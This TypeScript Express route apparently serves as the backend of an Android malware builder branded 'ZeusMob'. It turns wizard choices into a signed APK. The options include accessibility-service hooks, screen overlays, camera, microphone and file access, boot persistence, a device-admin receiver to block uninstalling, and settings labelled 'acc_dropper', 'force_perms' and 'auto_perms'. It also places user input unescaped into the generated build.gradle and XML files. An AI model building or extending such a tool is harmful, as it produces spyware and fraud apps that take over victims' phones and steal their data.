import { Router } from "express";
import { execSync, exec } from "child_process";
import * as fs from "fs";
import * as path from "path";
import * as os from "os";

const router = Router();

const ANDROID_HOME = "/home/runner/android-sdk";
const JAVA_HOME = execSync("dirname $(dirname $(readlink -f $(which java)))", { encoding: "utf8" }).trim();
const TEMPLATE_DIR = path.resolve(process.cwd(), "../../android-apk-builder");
const KEYSTORE_PATH = path.join(os.homedir(), ".android/debug.keystore");

// All permissions the wizard can select
const PERMISSION_MAP: Record<string, string[]> = {
  accessibility: [
    "android.permission.BIND_ACCESSIBILITY_SERVICE",
  ],
  app_usage: [
    "android.permission.PACKAGE_USAGE_STATS",
  ],
  draw_over: [
    "android.permission.SYSTEM_ALERT_WINDOW",
  ],
  camera: [
    "android.permission.CAMERA",
  ],
  files: [
    "android.permission.READ_EXTERNAL_STORAGE",
    "android.permission.READ_MEDIA_IMAGES",
    "android.permission.READ_MEDIA_VIDEO",
    "android.permission.READ_MEDIA_AUDIO",
    "android.permission.WRITE_EXTERNAL_STORAGE",
  ],
  microphone: [
    "android.permission.RECORD_AUDIO",
  ],
};

const BEHAVIOR_MAP: Record<string, string[]> = {
  prevent_sleep: ["android.permission.WAKE_LOCK"],
  prevent_stop:  ["android.permission.FOREGROUND_SERVICE", "android.permission.RECEIVE_BOOT_COMPLETED"],
  force_perms:   [],
};

const ADVANCED_MAP: Record<string, string[]> = {
  acc_dropper:  [],
  prevent_del:  ["android.permission.BIND_DEVICE_ADMIN"],
  auto_perms:   [],
  screen_lock:  [],
};

function buildManifestPermissions(selected: string[]): string {
  const perms = new Set<string>([
    "android.permission.INTERNET",
    "android.permission.ACCESS_NETWORK_STATE",
    "android.permission.POST_NOTIFICATIONS",
    "android.permission.VIBRATE",
  ]);

  for (const key of selected) {
    const extra = [
      ...(PERMISSION_MAP[key] || []),
      ...(BEHAVIOR_MAP[key] || []),
      ...(ADVANCED_MAP[key] || []),
    ];
    extra.forEach(p => perms.add(p));
  }

  return [...perms].map(p => `    <uses-permission android:name="${p}" />`).join("\n");
}

function buildManifest(cfg: ApkConfig): string {
  const permissions = buildManifestPermissions([
    ...Object.keys(cfg.perms).filter(k => cfg.perms[k]),
    ...Object.keys(cfg.behavior).filter(k => cfg.behavior[k]),
    ...Object.keys(cfg.advanced).filter(k => cfg.advanced[k]),
  ]);

  const hasAccessibility = cfg.perms.accessibility;
  const hasDeviceAdmin   = cfg.advanced.prevent_del;
  const hasForeground    = cfg.behavior.prevent_stop;
  const hasScreenLock    = cfg.advanced.screen_lock;
  const hasBoot          = cfg.behavior.prevent_stop;

  return `<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools">

${permissions}

    <application
        android:name=".ZeusMobApp"
        android:allowBackup="false"
        android:icon="@mipmap/ic_launcher"
        android:label="${cfg.appName}"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/Theme.ZeusMob"
        android:hardwareAccelerated="true"
        android:largeHeap="true"
        tools:targetApi="31">

        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:launchMode="singleTop"
            android:screenOrientation="portrait">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        ${hasAccessibility ? `<service
            android:name=".service.ZeusAccessibilityService"
            android:exported="true"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
            android:label="${cfg.appName} Accessibility">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService" />
            </intent-filter>
            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@xml/accessibility_service_config" />
        </service>` : ""}

        ${hasForeground ? `<service
            android:name=".service.ZeusForegroundService"
            android:exported="false"
            android:foregroundServiceType="specialUse" />` : ""}

        ${hasBoot ? `<receiver android:name=".receiver.BootReceiver" android:exported="true">
            <intent-filter android:priority="999">
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
            </intent-filter>
        </receiver>` : ""}

        ${hasScreenLock ? `<receiver android:name=".receiver.ScreenLockReceiver" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.SCREEN_OFF" />
                <action android:name="android.intent.action.SCREEN_ON" />
                <action android:name="android.intent.action.USER_PRESENT" />
            </intent-filter>
        </receiver>` : ""}

        ${hasDeviceAdmin ? `<receiver
            android:name=".receiver.ZeusDeviceAdminReceiver"
            android:exported="true"
            android:permission="android.permission.BIND_DEVICE_ADMIN">
            <meta-data android:name="android.app.device_admin"
                android:resource="@xml/device_admin_config" />
            <intent-filter>
                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
            </intent-filter>
        </receiver>` : ""}

        <provider
            android:name="androidx.core.content.FileProvider"
            android:authorities="${cfg.appId}.provider"
            android:exported="false"
            android:grantUriPermissions="true">
            <meta-data
                android:name="android.support.FILE_PROVIDER_PATHS"
                android:resource="@xml/file_paths" />
        </provider>

    </application>
</manifest>
`;
}

function buildAppGradle(cfg: ApkConfig): string {
  // Parse version: "1.0.3 (427)" → name="1.0.3", code=427
  const verMatch = cfg.appVersion.match(/^([\d.]+)\s*(?:\((\d+)\))?$/);
  const versionName = verMatch ? verMatch[1] : "1.0.0";
  const versionCode = verMatch && verMatch[2] ? parseInt(verMatch[2]) : 1;

  return `plugins {
    id 'com.android.application'
}

android {
    namespace 'com.zeusmob.app'
    compileSdk 34

    defaultConfig {
        applicationId "${cfg.appId}"
        minSdk 24
        targetSdk 34
        versionCode ${versionCode}
        versionName "${versionName}"
        multiDexEnabled true
    }

    signingConfigs {
        debug {
            storeFile file("${KEYSTORE_PATH}")
            storePassword 'android'
            keyAlias 'androiddebugkey'
            keyPassword 'android'
            storeType 'PKCS12'
        }
        release {
            storeFile file("${KEYSTORE_PATH}")
            storePassword 'android'
            keyAlias 'androiddebugkey'
            keyPassword 'android'
            storeType 'PKCS12'
        }
    }

    buildTypes {
        debug {
            debuggable true
            minifyEnabled false
            signingConfig signingConfigs.debug
        }
        release {
            debuggable false
            minifyEnabled true
            shrinkResources true
            signingConfig signingConfigs.release
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }
    }

    splits { abi { enable false } }

    compileOptions {
        sourceCompatibility JavaVersion.VERSION_17
        targetCompatibility JavaVersion.VERSION_17
    }

    applicationVariants.configureEach { variant ->
        variant.outputs.configureEach { output ->
            outputFileName = "${cfg.appName.replace(/\s+/g, "_")}-${versionName}-universal.apk"
        }
    }
}

dependencies {
    implementation 'androidx.appcompat:appcompat:1.6.1'
    implementation 'com.google.android.material:material:1.11.0'
    implementation 'androidx.constraintlayout:constraintlayout:2.1.4'
    implementation 'androidx.core:core:1.12.0'
    implementation 'androidx.multidex:multidex:2.0.1'
    implementation 'androidx.work:work-runtime:2.9.0'
}
`;
}

interface ApkConfig {
  appName: string;
  clientName: string;
  appLink: string;
  notifTitle: string;
  notifMessage: string;
  appVersion: string;
  appId: string;
  iconBase64?: string;
  perms: Record<string, boolean>;
  behavior: Record<string, boolean>;
  advanced: Record<string, boolean>;
}

// POST /api/apk/build
router.post("/apk/build", async (req, res) => {
  const cfg: ApkConfig = req.body;

  if (!cfg.appId || !cfg.appName || !cfg.appVersion) {
    res.status(400).json({ error: "appId, appName e appVersion são obrigatórios" });
    return;
  }

  // Create isolated temp build dir
  const buildDir = fs.mkdtempSync(path.join(os.tmpdir(), "zeus-apk-"));
  req.log.info({ buildDir, appId: cfg.appId }, "APK build started");

  try {
    // 1. Copy the template project
    execSync(`cp -r "${TEMPLATE_DIR}/." "${buildDir}/"`, { stdio: "pipe" });

    // 2. Write local.properties
    fs.writeFileSync(
      path.join(buildDir, "local.properties"),
      `sdk.dir=${ANDROID_HOME}\njava.home=${JAVA_HOME}\n`
    );

    // 3. Patch AndroidManifest.xml
    fs.writeFileSync(
      path.join(buildDir, "app/src/main/AndroidManifest.xml"),
      buildManifest(cfg)
    );

    // 4. Patch app/build.gradle
    fs.writeFileSync(
      path.join(buildDir, "app/build.gradle"),
      buildAppGradle(cfg)
    );

    // 5. Patch strings.xml
    const stringsPath = path.join(buildDir, "app/src/main/res/values/strings.xml");
    fs.writeFileSync(stringsPath, `<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">${cfg.appName}</string>
    <string name="app_link">${cfg.appLink}</string>
    <string name="notif_title">${cfg.notifTitle}</string>
    <string name="notif_message">${cfg.notifMessage}</string>
    <string name="client_name">${cfg.clientName}</string>
    <string name="accessibility_service_label">${cfg.appName} Service</string>
    <string name="accessibility_service_description">Serviço ${cfg.appName} para automação e monitoramento.</string>
</resources>`);

    // 6. Write app icon if provided (base64 PNG)
    if (cfg.iconBase64) {
      const iconData = cfg.iconBase64.replace(/^data:image\/\w+;base64,/, "");
      const iconBuf = Buffer.from(iconData, "base64");
      const iconDirs = [
        "app/src/main/res/mipmap-hdpi",
        "app/src/main/res/mipmap-mdpi",
        "app/src/main/res/mipmap-xhdpi",
        "app/src/main/res/mipmap-xxhdpi",
        "app/src/main/res/mipmap-xxxhdpi",
      ];
      for (const d of iconDirs) {
        const dir = path.join(buildDir, d);
        fs.mkdirSync(dir, { recursive: true });
        fs.writeFileSync(path.join(dir, "ic_launcher.png"), iconBuf);
        fs.writeFileSync(path.join(dir, "ic_launcher_round.png"), iconBuf);
      }
    }

    // 7. Run Gradle build using system gradle (Gradle 8.14.2 installed via Nix)
    const gradleBin = execSync("which gradle", { encoding: "utf8" }).trim();
    const gradleCmd = `${gradleBin} assembleRelease --no-daemon --quiet`;
    req.log.info({ gradleCmd }, "Running Gradle build");

    execSync(gradleCmd, {
      cwd: buildDir,
      stdio: "pipe",
      env: {
        ...process.env,
        ANDROID_HOME,
        JAVA_HOME,
        PATH: `${JAVA_HOME}/bin:${ANDROID_HOME}/cmdline-tools/latest/bin:${ANDROID_HOME}/build-tools/34.0.0:${ANDROID_HOME}/platform-tools:${process.env.PATH}`,
        HOME: os.homedir(),
      },
      timeout: 5 * 60 * 1000, // 5 min
    });

    // 9. Find the APK
    const apkDir = path.join(buildDir, "app/build/outputs/apk/release");
    const apkFiles = fs.readdirSync(apkDir).filter(f => f.endsWith(".apk"));
    if (!apkFiles.length) throw new Error("Nenhum APK encontrado após o build");

    const apkPath = path.join(apkDir, apkFiles[0]);
    const apkSize = fs.statSync(apkPath).size;
    req.log.info({ apkPath, apkSize }, "APK build successful");

    // 10. Stream APK to client
    res.setHeader("Content-Type", "application/vnd.android.package-archive");
    res.setHeader("Content-Disposition", `attachment; filename="${apkFiles[0]}"`);
    res.setHeader("Content-Length", apkSize);
    res.setHeader("X-Apk-Name", apkFiles[0]);
    res.setHeader("X-Apk-Size", String(apkSize));

    const stream = fs.createReadStream(apkPath);
    stream.pipe(res);

    stream.on("end", () => {
      // Cleanup temp dir after sending
      fs.rmSync(buildDir, { recursive: true, force: true });
    });

  } catch (err: any) {
    req.log.error({ err: err.message }, "APK build failed");
    // Cleanup on error
    try { fs.rmSync(buildDir, { recursive: true, force: true }); } catch {}
    res.status(500).json({
      error: "Falha no build do APK",
      detail: err.stderr?.toString() || err.message,
    });
  }
});

export default router;
